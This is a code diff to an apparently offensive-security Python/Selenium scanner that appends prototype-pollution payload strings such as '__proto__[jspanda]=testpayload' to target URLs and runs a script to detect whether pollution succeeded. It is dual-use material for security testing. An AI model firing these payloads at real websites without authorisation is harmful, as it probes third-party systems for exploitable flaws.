@@ -53,7 +53,7 @@ payloads = [
 	"__proto__.jspanda=testpayload",
 	"__proto__[jspanda]=testpayload",
 	"constructor.prototype.jspanda=testpayload",		
-	"constructor.prototype.[jspanda]=testpayload",
+	"constructor.[prototype].jspanda=testpayload",
 	"?__proto__.jspanda=testpayload",
 	"?__proto__[jspanda]=testpayload",
 	"#__proto__.jspanda=testpayload",
@@ -74,8 +74,6 @@ payloads = [
 
 
 driver = webdriver.Chrome(options=chrome_options, executable_path=chrome_driver)
-wait = WebDriverWait(driver, 10)
-small_wait = WebDriverWait(driver, 4)
 
 result = []
 for _x in new_target:
@@ -88,7 +86,6 @@ for _x in new_target:
 			driver.get(_x+payload)
 			driver.maximize_window()
 			print("+-+-+-+-+ Panda is Rolling +-+-+-+-+")
-			small_wait
 			info = driver.execute_script(open("./payload.js").read())
 
 			if "happy" in str(info):
